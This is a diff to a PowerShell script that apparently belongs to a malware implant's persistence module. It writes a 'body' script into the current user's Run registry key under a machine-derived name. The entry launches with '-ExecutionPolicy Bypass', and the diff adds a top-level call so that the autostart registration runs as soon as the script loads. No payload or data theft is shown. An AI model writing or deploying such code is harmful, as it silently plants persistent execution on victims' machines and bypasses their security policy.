@@ -1,12 +1,12 @@
 . ./utils.ps1
 . ./consts_body.ps1
 
-function Add-HolderToStartup {
+function Add-BodyToStartup {
     
     $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $keyName = Get-MachineCode
-    $holderPath = Get-HolderPath
-    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$holderPath`" -ArgumentList '-autostart true'"
+    $bodyPath = Get-BodyPath
+    $value = "powershell.exe -ExecutionPolicy Bypass -File `"$bodyPath`" -ArgumentList '-autostart true'"
 
     RegWrite -registryPath $registryPath -keyName $keyName -value $value
 }
@@ -24,8 +24,10 @@ function do_autoregistry {
     }
     try 
     {
-        Add-HolderToStartup
+        Add-BodyToStartup
     } catch {
         writedbg "Error  DoRegistryAutoStart $_"
     }
 }
+
+do_autoregistry
